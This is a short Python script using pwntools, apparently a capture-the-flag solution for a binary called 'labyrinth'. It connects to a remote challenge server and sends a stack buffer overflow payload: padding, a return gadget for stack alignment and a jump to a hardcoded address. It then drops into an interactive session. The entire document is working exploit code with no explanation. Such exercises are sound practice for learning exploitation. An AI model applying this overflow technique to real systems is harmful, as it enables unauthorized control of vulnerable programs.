import sys
from pwn import *

rem = True
p = None
elf = ELF('./labyrinth')
rop = ROP(elf)
res = rop.find_gadget(['ret'])
g_ret = res.address

if not rem:
    p = process('./labyrinth')
else:
    p = remote('144.126.196.198', 31530)

p.sendline(b'69')
input()
p.sendline(b'A' * 48 + b'B' * 8 + p64(g_ret) + p64(0x00401255))
p.interactive()
